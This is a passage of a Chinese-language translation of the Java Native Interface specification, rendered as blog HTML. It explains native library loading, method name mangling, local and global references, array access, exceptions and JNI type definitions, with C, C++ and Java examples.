class=\"line\"></span><br><span class=\"line\">     <span class=\"keyword\">native</span> <span class=\"type\">double</span> <span class=\"title function_\">f</span><span class=\"params\">(<span class=\"type\">int</span> i, String s)</span>; </span><br><span class=\"line\"></span><br><span class=\"line\">     <span class=\"keyword\">static</span> &#123; </span><br><span class=\"line\">         System.loadLibrary(“pkg_Cls”); </span><br><span class=\"line\">     &#125; </span><br><span class=\"line\"></span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p>System.loadLibrary的参数是程序员任意选择的一个库名。系统遵循一种标准的但特定于平台的方法将库名转换成原生库名。例如Solaris系统将名字pkg_Cls转换为libpkg_Cls.so，而Win32系统将名字pkg_Cls转换为pkg_Cls.dll</p>\n<p>程序员可以使用一个库来保存任意数量类所需要的所有本地方法，只要使用相同的类加载器来加载这些类。VM内部为每个类加载器维护一个原生库加载列表。VM制造商应该选择本地库名称，以减少名称冲突的可能性。</p>\n<p>如果底层操作系统不支持动态链接，VM必须预链接所有本地方法。在这种情况下，VM完成System.loadLibrary调用而不实际加载库。</p>\n<p>程序员也可以调用JNI函数RegisterNatives来注册与类相关联的原生方法。RegisterNatives函数对于静态链接函数特别有用。</p>\n<h3 id=\"解析原生方法名\"><a href=\"#解析原生方法名\" class=\"headerlink\" title=\"解析原生方法名\"></a>解析原生方法名</h3><p>原生方法名由以下组件连接而成：</p>\n<ul>\n<li>Java_前缀</li>\n<li>完全的类名</li>\n<li>下划线分隔符_</li>\n<li>方法名</li>\n<li>对于重载的本地方法，在两个下划线__后面加上参数签名</li>\n</ul>\n<p>VM检查方法名是否与驻留在原生库中的方法相匹配。VM首先查找短名称，没有参数签名的名称。然后查找长名称，带有参数签名的名称。只有当原生方法被另一个原生方法重载时，程序员才需要使用长名称。然而如果原生方法与非原生方法具有相同的名称，这是没有问题的。非原生方法不会驻留在原生库中。</p>\n<p>在下面的例子中，原生方法g不必使用长名称进行链接，因为另一个方法g不是原生方法，因此不在原生库中。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Cls1</span> &#123; </span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"type\">int</span> <span class=\"title function_\">g</span><span class=\"params\">(<span class=\"type\">int</span> i)</span>; </span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">native</span> <span class=\"type\">int</span> <span class=\"title function_\">g</span><span class=\"params\">(<span class=\"type\">double</span> d)</span>; </span><br><span class=\"line\"></span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p>我们采用一个简单的名称修改方案来确保所有的Unicode字符都转换为有效的C函数名。我们使用下划线字段_来替换完全类名中的斜杠/。由于名称和类型描述从不以数字开头，我们可以使用_0…_9来表示转义字符。</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">转义字符</th>\n<th align=\"center\">表示</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">_0XXXX</td>\n<td align=\"center\">Unicode字符XXXX，使用小写字符表示非ASC码Unicode字符，例如_0abcd</td>\n</tr>\n<tr>\n<td align=\"center\">_1</td>\n<td align=\"center\">字符_</td>\n</tr>\n<tr>\n<td align=\"center\">_2</td>\n<td align=\"center\">字符;</td>\n</tr>\n<tr>\n<td align=\"center\">_3</td>\n<td align=\"center\">字符[</td>\n</tr>\n</tbody></table>\n<p>在给定的平台上，本地方法和接口API都遵循标准库调用约定。例如UNIX系统使用C调用约定，Win32系统使用__stdcall</p>\n<h3 id=\"本地方法参数\"><a href=\"#本地方法参数\" class=\"headerlink\" title=\"本地方法参数\"></a>本地方法参数</h3><p>JNI接口指针是本地方法的第一个参数。JNI接口指针的类型是JNIEnv。第二个参数取决于本地方法是静态的还是非静态的。非静态本地方法的第二个参数是对对象的引用，静态本地方法的第二个参数是对Java类的引用。</p>\n<p>其余参数对应于普通Java方法参数。本地方法调用通过返回值将结果传递回调用程序。</p>\n<p>下面的例子演示了使用C函数去实现原生方法f</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> pkg;  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Cls</span> &#123; </span><br><span class=\"line\"></span><br><span class=\"line\">     <span class=\"keyword\">native</span> <span class=\"type\">double</span> <span class=\"title function_\">f</span><span class=\"params\">(<span class=\"type\">int</span> i, String s)</span>; </span><br><span class=\"line\"></span><br><span class=\"line\">     ... </span><br><span class=\"line\"></span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p>带有长名称Java_pkg_Cls_f_ILjava_lang_String_2的C函数实现本地方法f</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">jdouble <span class=\"title function_\">Java_pkg_Cls_f__ILjava_lang_String_2</span> <span class=\"params\">(</span></span><br><span class=\"line\"><span class=\"params\">     JNIEnv *env,        <span class=\"comment\">/* interface pointer */</span></span></span><br><span class=\"line\"><span class=\"params\">     jobject obj,        <span class=\"comment\">/* &quot;this&quot; pointer */</span></span></span><br><span class=\"line\"><span class=\"params\">     jint i,             <span class=\"comment\">/* argument #1 */</span></span></span><br><span class=\"line\"><span class=\"params\">     jstring s)</span>          <span class=\"comment\">/* argument #2 */</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">     <span class=\"comment\">/* Obtain a C-copy of the Java string */</span></span><br><span class=\"line\">     <span class=\"type\">const</span> <span class=\"type\">char</span> *str = (*env)-&gt;GetStringUTFChars(env, s, <span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">     <span class=\"comment\">/* process the string */</span></span><br><span class=\"line\">     ...</span><br><span class=\"line\"></span><br><span class=\"line\">     <span class=\"comment\">/* Now we are done with str */</span></span><br><span class=\"line\">     (*env)-&gt;ReleaseStringUTFChars(env, s, str);</span><br><span class=\"line\"></span><br><span class=\"line\">     <span class=\"keyword\">return</span> ...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>注意，我们总是使用接口指针env操作Java对象。下面的例子是C++版本:</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">extern</span> <span class=\"string\">&quot;C&quot;</span> <span class=\"comment\">/* specify the C calling convention */</span>  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">jdouble <span class=\"title\">Java_pkg_Cls_f__ILjava_lang_String_2</span> <span class=\"params\">( </span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\"></span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">     JNIEnv *env,        <span class=\"comment\">/* interface pointer */</span> </span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\"></span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">     jobject obj,        <span class=\"comment\">/* &quot;this&quot; pointer */</span> </span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\"></span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">     jint i,             <span class=\"comment\">/* argument #1 */</span> </span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\"></span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">     jstring s)</span>          <span class=\"comment\">/* argument #2 */</span> </span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123; </span><br><span class=\"line\"></span><br><span class=\"line\">     <span class=\"type\">const</span> <span class=\"type\">char</span> *str = env-&gt;<span class=\"built_in\">GetStringUTFChars</span>(s, <span class=\"number\">0</span>); </span><br><span class=\"line\"></span><br><span class=\"line\">     ... </span><br><span class=\"line\"></span><br><span class=\"line\">     env-&gt;<span class=\"built_in\">ReleaseStringUTFChars</span>(s, str); </span><br><span class=\"line\"></span><br><span class=\"line\">     <span class=\"keyword\">return</span> ... </span><br><span class=\"line\"></span><br><span class=\"line\">&#125; </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>在C++中额外的间接层和接口指针参数从源代码中消失了。然而其底层机制和C完全相同。在C++中JNI函数被定义为内联成员函数，可以扩展为C对应函数。</p>\n<h3 id=\"引用Java对象\"><a href=\"#引用Java对象\" class=\"headerlink\" title=\"引用Java对象\"></a>引用Java对象</h3><p>基本类型比如整数、字符等在Java和原生代码之间被复制。另一方面，Java对象是通过引用传递的。VM必须持续跟踪所有被传递到原生代码的对象，以便垃圾回收器不会释放这些对象。反之，原生代码必须有一种方式通知VM它不在需要这些对象。此外，垃圾回收器必须能够移动原生代码引用的对象。</p>\n<h3 id=\"全局和本地引用\"><a href=\"#全局和本地引用\" class=\"headerlink\" title=\"全局和本地引用\"></a>全局和本地引用</h3><p>JNI将原生代码使用的对象引用分为两类：本地引用和全局引用。本地引用在原生方法调用期间有效，并且在原生方法返回后自动释放。全局引用在明确释放之前保持有效。</p>\n<p>传递给原生方法的对象作为本地引用。JNI函数返回的所有Java对象都是本地引用。JNI允许程序员通过本地引用创建全局引用。期望Java对象的JNI函数同时接受全局和本地引用。原生方法可以返回对于VM的本地或者全局引用作为其结果。</p>\n<p>通常，程序员应该在原生方法返回后依靠VM释放所有本地引用。然而有时程序员应该明确释放本地引用。比如考虑以下情况：</p>\n<ul>\n<li>原生方法访问大型Java对象，从而创建对Java对象的本地引用。原生方法在返回调用者之前执行额外的计算。对大型Java对象的本地引用将防止对象被垃圾回收，即使该对象在剩余的计算中不再使用。</li>\n<li>原生方法会创建大量的本地引用，尽管并不是所有的本地引用都同时使用。由于VM需要一定的空间来持续跟踪本地引用，创建太多本地引用可能导致系统内存溢出。例如，本地方法循环遍历一个大的对象数组，获取元素作为本地引用，并在每次迭代中对一个元素进行操作。在每次迭代之后，程序员不再需要对数组元素的本地引用。</li>\n</ul>\n<p>JNI允许程序员在原生方法中的任何一点手动删除本地引用。为了确保程序员能够手动释放本地引用，JNI函数不允许创建额外的本地引用，除了它们作为返回结果的引用。</p>\n<p>本地引用仅在创建它们的线程中有效。原生代码不能将本地引用从一个线程传递到另一个线程。</p>\n<h3 id=\"实现本地引用\"><a href=\"#实现本地引用\" class=\"headerlink\" title=\"实现本地引用\"></a>实现本地引用</h3><p>为了实现本地引用，Java VM为控制从Java到原生方法的每次转换创建一个注册表。注册表将不可移动的本地引用映射为Java对象，并防止对象被垃圾回收。所有传递给原生方法的Java对象(包括作为JNI函数调用返回结果的那些对象)都被自动添加到注册表中。注册表在原生方法返回后被删除，它的所有内容被垃圾回收。</p>\n<p>有不同的方法来实现注册表，例如使用表、链表或者散列表。虽然引用计数可以用来避免注册表中的重复内容，但是JNI实现并没有义务检测和折叠重复内容。</p>\n<p>注意，仅通过扫描原生堆栈不能准确的实现本地引用。原生代码可以将本地引用保存在全局或者堆数据结构中。</p>\n<h3 id=\"访问Java对象\"><a href=\"#访问Java对象\" class=\"headerlink\" title=\"访问Java对象\"></a>访问Java对象</h3><p>JNI为全局和本地引用提供了一组丰富的访问函数。这意味着无论VM内部如何表示Java对象，相同的原生方法实现都可以工作。这是JNI能够被各种VM实现支持的一个重要原因。</p>\n<p>通过引用使用访问函数的开销要高于直接访问C数据结构。在大多数情况下，我们相信Java程序员使用原生方法来执行一些重要任务，这些任务掩盖了接口的开销。</p>\n<h3 id=\"访问原始数组\"><a href=\"#访问原始数组\" class=\"headerlink\" title=\"访问原始数组\"></a>访问原始数组</h3><p>对于包含许多基本数据类型的大型Java对象，这种开销是不能接受的。考虑用于执行向量和矩阵计算的原生方法。遍历Java数组并使用函数调用获取每个元素的效率非常低。</p>\n<p>一种解决方案引入了固定的概念，以便原生方法可以要求VM固定数组的内容。原生方法然后接收一个指向元素的指针。然而这种方法有两个条件:</p>\n<ul>\n<li>垃圾回收必须支持固定</li>\n<li>VM必须在内存中连续存储原始数组。虽然这是大多数原始数组最合理的实现，布尔数组可以通过打包或解包实现。因此依赖于布尔数组精确布局的原生代码是不可移植的。</li>\n</ul>\n<p>我们采用折中方案克服了上面的两个问题。</p>\n<p>首先我们提供了一组函数在Java数组和原生内存缓冲区之间复制基本数组元素。如果原生方法只需要访问一个大数组中的少量元素则使用这些函数。</p>\n<p>其次程序员可以使用另一组函数来获取数组元素的固定版本。请记住这些函数可能需要Java VM执行存储分配和复制。这些函数实际上是否复制数组取决于VM的实现:</p>\n<ul>\n<li>如果垃圾回收支持固定，并且数组的存储与原生方法所期望的相同则不需要复制。</li>\n<li>否则数组将被复制到一个不可移动的内存块(比如C堆中)，并执行必要的格式转换。返回一个副本的指针。</li>\n</ul>\n<p>最后接口提供了通知VM原生代码不再需要访问数组元素的函数。当调用这些函数时，系统将解除数组的固定，或者将原始数组与其不可移动的副本进行协调并释放副本。</p>\n<p>我们提供的方法更加灵活。垃圾回收算法可以对每个给定数组的复制或者固定做出单独的决定。比如，垃圾回收可以复制小对象，但固定大对象。</p>\n<p>JNI实现必须确保在多个线程中运行的原生方法能够同时访问同一个数组。比如，JNI可以为每个固定的数组保留一个内部计数器，这样一个线程就不会解除另一个线程固定的数组。注意，JNI不需要为原生方法的独占访问锁定原始数组。同时从不同的线程更新Java数组会导致不确定的结果。</p>\n<h3 id=\"访问属性和方法\"><a href=\"#访问属性和方法\" class=\"headerlink\" title=\"访问属性和方法\"></a>访问属性和方法</h3><p>JNI允许原生代码访问属性和调用Java对象方法。JNI通过符号名和类型签名来标识方法和属性。两步法从名称和签名中计算出定位属性或方法的成本。比如，调用cls类中的方法f时，原生代码首先获取一个方法ID:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">jmethodID mid =      env-&gt;GetMethodID(cls, “f”, “(ILjava/lang/String;)D”); </span><br></pre></td></tr></table></figure>\n\n<p>然后，原生代码可以重复使用方法ID而不需要执行方法查找</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">jdouble result = env-&gt;CallDoubleMethod(obj, mid, <span class=\"number\">10</span>, str); </span><br></pre></td></tr></table></figure>\n\n<p>属性或方法ID不会阻止VM卸载从其生成ID的类。类被卸载之后属性或方法ID将不可用。因此，如果打算在一段时间内使用属性或者方法ID，原生代码必须确保:</p>\n<ul>\n<li>保持对底层类的引用</li>\n<li>或者重新计算属性或方法ID</li>\n</ul>\n<p>JNI不会对属性和方法ID如何在内部实现施加任何限制。</p>\n<h3 id=\"报告编程错误\"><a href=\"#报告编程错误\" class=\"headerlink\" title=\"报告编程错误\"></a>报告编程错误</h3><p>JNI不检查编程错误，比如传空指针或者非法参数类型。非法参数类型包括使用普通Java对象而不是Java类对象。JNI不检查这些编程错误的原因如下:</p>\n<ul>\n<li>强制JNI函数检查所有可能的错误条件会降低正常原生方法的性能</li>\n<li>在很多情况下，没有足够的运行时类型信息来执行这样的检查</li>\n</ul>\n<p>大多数C库函数不能防止编程错误。比如，当printf函数接收到一个无效地址时通常会引发运行时错误，而不是返回错误代码。强制C库函数检查所有可能的错误条件可能导致这样的检查在用户代码中和库中重复进行。</p>\n<p>程序员不能向JNI函数传递非法指针或错误类型参数。这样会导致不可预期的后果，包括系统状态损坏或VM崩溃。</p>\n<h3 id=\"Java异常\"><a href=\"#Java异常\" class=\"headerlink\" title=\"Java异常\"></a>Java异常</h3><p>JNI允许原生方法引发任意Java异常。原生代码也能处理未处理的Java异常。未处理的Java异常被传递回VM。</p>\n<h3 id=\"异常和错误代码\"><a href=\"#异常和错误代码\" class=\"headerlink\" title=\"异常和错误代码\"></a>异常和错误代码</h3><p>某些JNI函数使用Java异常机制来报告错误条件。在很多情况下，JNI函数通过返回错误代码并且抛出Java异常来报告错误条件。错误代码通常是一个特殊的返回值(比如NULL)，它超出了正常返回值的范围。因此程序员可以:</p>\n<ul>\n<li>快速检查最后一个JNI调用的返回值，已确定是否发生了错误</li>\n<li>调用ExceptionOccurred函数以获取包含更详细描述错误条件的异常对象</li>\n</ul>\n<p>在两种情况下，程序员需要检查异常而不能首先检查错误代码:</p>\n<ul>\n<li>调用Java方法的JNI函数返回Java方法的结果。程序员必须调用ExceptionOccurred来检查Java方法执行期间可能发生的异常</li>\n<li>一些JNI数组访问函数不返回错误代码，但可能抛出ArrayIndexOutOfBoundsException或ArrayStoreException异常</li>\n</ul>\n<p>在所有其他情况下，非错误返回值保证没有抛出异常。</p>\n<h3 id=\"异步异常\"><a href=\"#异步异常\" class=\"headerlink\" title=\"异步异常\"></a>异步异常</h3><p>在多线程情况下，当前线程之外的其他线程可能抛出异步异常。异步异常不会立即影响当前线程中原生代码的执行，直到:</p>\n<ul>\n<li>原生代码调用可能引发同步异常的JNI函数</li>\n<li>原生代码使用ExceptionOccurred明确的检查同步和异步异常</li>\n</ul>\n<p>注意，只有那些可能引发同步异常的JNI函数才会检查异步异常</p>\n<p>原生方法应该在必要的地方插入ExceptionOccurred检查(比如在没有其他异常检查的循环中)，以确保当前线程在合理的时间内响应异步异常。</p>\n<h3 id=\"异常处理\"><a href=\"#异常处理\" class=\"headerlink\" title=\"异常处理\"></a>异常处理</h3><p>在原生代码中有两种处理异常的方法:</p>\n<ul>\n<li>原生方法可以选择立即返回，从而使在初始化原生方法调用的Java代码中抛出异常</li>\n<li>原生代码可以通过调用ExceptionClear清除异常，然后执行自己的异常处理代码</li>\n</ul>\n<p>在异常出现之后，原生代码必须在调用其他JNI函数之前首先清除异常。当存在待处理的异常时，可以安全调用的JNI函数包括:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ExceptionOccurred()</span><br><span class=\"line\">ExceptionDescribe()</span><br><span class=\"line\">ExceptionClear()</span><br><span class=\"line\">ExceptionCheck()</span><br><span class=\"line\">ReleaseStringChars()</span><br><span class=\"line\">ReleaseStringUTFChars()</span><br><span class=\"line\">ReleaseStringCritical()</span><br><span class=\"line\">Release&lt;Type&gt;ArrayElements()</span><br><span class=\"line\">ReleasePrimitiveArrayCritical()</span><br><span class=\"line\">DeleteLocalRef()</span><br><span class=\"line\">DeleteGlobalRef()</span><br><span class=\"line\">DeleteWeakGlobalRef()</span><br><span class=\"line\">MonitorExit()</span><br><span class=\"line\">PushLocalFrame()</span><br><span class=\"line\">PopLocalFrame()</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"第三章\"><a href=\"#第三章\" class=\"headerlink\" title=\"第三章\"></a>第三章</h2><h3 id=\"基本类型\"><a href=\"#基本类型\" class=\"headerlink\" title=\"基本类型\"></a>基本类型</h3><p>下面的表格描述Java基本类型和对应的依赖于机器的原生类型</p>\n<table>\n<thead>\n<tr>\n<th>Java类型</th>\n<th>原生类型</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>boolean</td>\n<td>jboolean</td>\n<td>无符号8位</td>\n</tr>\n<tr>\n<td>byte</td>\n<td>jbyte</td>\n<td>有符号8位</td>\n</tr>\n<tr>\n<td>char</td>\n<td>jchar</td>\n<td>无符号16位</td>\n</tr>\n<tr>\n<td>short</td>\n<td>jshort</td>\n<td>有符号16位</td>\n</tr>\n<tr>\n<td>int</td>\n<td>jint</td>\n<td>有符号32位</td>\n</tr>\n<tr>\n<td>long</td>\n<td>jlong</td>\n<td>有符号64位</td>\n</tr>\n<tr>\n<td>float</td>\n<td>jfloat</td>\n<td>32位</td>\n</tr>\n<tr>\n<td>double</td>\n<td>jdouble</td>\n<td>64位</td>\n</tr>\n<tr>\n<td>void</td>\n<td>void</td>\n<td></td>\n</tr>\n</tbody></table>\n<p>为了方便起见提供了以下定义</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> JNI_FALSE  0 </span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> JNI_TRUE   1 </span></span><br></pre></td></tr></table></figure>\n\n<p>jsize整数类型用于描述基本的索引和大小</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> jint jsize; </span><br></pre></td></tr></table></figure>\n\n<h3 id=\"引用类型\"><a href=\"#引用类型\" class=\"headerlink\" title=\"引用类型\"></a>引用类型</h3><p>JNI包含很多对应于不同Java对象类型的引用类型。</p>\n<p><img src=\"./images/types4.gif\"></p>\n<p>在C中，所有其他JNI引用类型都被定义为与jobject相同。比如:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> jobject jclass; </span><br></pre></td></tr></table></figure>\n\n<p>在C++中，JNI引入了一组虚拟类来表示子类型关系。比如:</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">_jobject</span> &#123;&#125;; </span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">_jclass</span> : <span class=\"keyword\">public</span> _jobject &#123;&#125;; </span><br><span class=\"line\">... </span><br><span class=\"line\"><span class=\"keyword\">typedef</span> _jobject *jobject; </span><br><span class=\"line\"><span class=\"keyword\">typedef</span> _jclass *jclass; </span><br></pre></td></tr></table></figure>\n\n<h3 id=\"属性和方法ID\"><a href=\"#属性和方法ID\" class=\"headerlink\" title=\"属性和方法ID\"></a>属性和方法ID</h3><p>方法和属性ID是常规的C指针类型</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">jfieldID</span>;</span>              <span class=\"comment\">/* opaque structure */</span> </span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">jfieldID</span> *<span class=\"title\">jfieldID</span>;</span>   <span class=\"comment\">/* field IDs */</span> </span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">jmethodID</span>;</span>              <span class=\"comment\">/* opaque structure */</span> </span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">jmethodID</span> *<span class=\"title\">jmethodID</span>;</span> <span class=\"comment\">/* method IDs */</span> </span><br></pre></td></tr></table></figure>\n\n<h3 id=\"值类型\"><a href=\"#值类型\" class=\"headerlink\" title=\"值类型\"></a>值类型</h3><p>jvalue联合类型被用作参数数组中的元素类型。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">union</span> <span class=\"title\">jvalue</span> &#123;</span> </span><br><span class=\"line\">    jboolean z; </span><br><span class=\"line\">    jbyte    b; </span><br><span class=\"line\">    jchar    c; </span><br><span class=\"line\">    jshort   s; </span><br><span class=\"line\">    jint     i; </span><br><span class=\"line\">    jlong    j; </span><br><span class=\"line\">    jfloat   f; </span><br><span class=\"line\">    jdouble  d; </span><br><span class=\"line\">    jobject  l; </span><br><span class=\"line\">&#125; jvalue; </span><br></pre></td></tr></table></figure>\n\n<h3 id=\"类型签名\"><a href=\"#类型签名\" class=\"headerlink\" title=\"类型签名\"></a>类型签名</h3><p>JNI使用Java VM的类型签名表示。</p>\n<table>\n<thead>\n<tr>\n<th>类型签名</th>\n<th>Java类型</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>Z</td>\n<td>boolean</td>\n</tr>\n<tr>\n<td>B</td>\n<td>byte</td>\n</tr>\n<tr>\n<td>C</td>\n<td>char</td>\n</tr>\n<tr>\n<td>S</td>\n<td>short</td>\n</tr>\n<tr>\n<td>I</td>\n<td>int</td>\n</tr>\n<tr>\n<td>J</td>\n<td>long</td>\n</tr>\n<tr>\n<td>F</td>\n<td>float</td>\n</tr>\n<tr>\n<td>D</td>\n<td>double</td>\n</tr>\n<tr>\n<td>L fully-qualified-class ;</td>\n<td>完整类名</td>\n</tr>\n<tr>\n<td>[ type</td>\n<td>类型数组</td>\n</tr>\n<tr>\n<td>( arg-types ) ret-type</td>\n<td>方法类型</td>\n</tr>\n</tbody></table>\n<p>比如，Java方法:</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">long</span> <span class=\"title function_\">f</span> <span class=\"params\">(<span class=\"type\">int</span> n, String s, <span class=\"type\">int</span>[] arr)</span>; </span><br></pre></td></tr></table></figure>\n\n<p>对应下面的类型签名:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(ILjava/lang/String;[I)J </span><br></pre></td></tr></table></figure>\n\n<h3 id=\"改进的UTF-8字符串\"><a href=\"#改进的UTF-8字符串\" class=\"headerlink\" title=\"改进的UTF-8字符串\"></a>改进的UTF-8字符串</h3><p>JNI使用改进的UTF-8字符串来表示各种字符串类型。改进的UTF-8字符串与Java VM使用的字符串相同。对改进的UTF-8字符串进行编码，以便仅包含非空ASC码字符的字符序列只能用每个字符一个字节表示，但是所有Unicode字符都能被表示。</p>\n<p>这种格式与标准UTF-8格式之间有两个不同。首先，使用双字节格式而不是单字节格式对空字符进行编码。这意味着改进的UTF-8字符串永远不会引入空值。其次，只使用标准UTF-8的一字节、二字节和三字节格式。Java VM不识别标准UTF-8的四字节格式，它使用自己的两倍三字节格式代替。</p>\n<h2 id=\"第四章\"><a href=\"#第四章\" class=\"headerlink\" title=\"第四章\"></a>第四章</h2><p>本章作为JNI函数的参考部分，提供了所有JNI函数的完整列表。</p>\n<p>注意，”必须”一词用来描述对JNI程序员的限制。比如，当你看到某个JNI函数必须接收一个非空对象时，你有责任确保没有将空传递给JNI函数。因此，JNI实现不需要在该JNI函数中执行空指针检查。</p>\n<h3 id=\"接口函数表\"><a href=\"#接口函数表\" class=\"headerlink\" title=\"接口函数表\"></a>接口函数表</h3><p>每个函数都可以通过JNIEnv参数以固定的偏移量访问。JNIEnv类型是一个指向存储所有JNI函数指针结构体的指针。定义如下:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"type\">const</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">JNINativeInterface</span> *<span class=\"title\">JNIEnv</span>;</span> 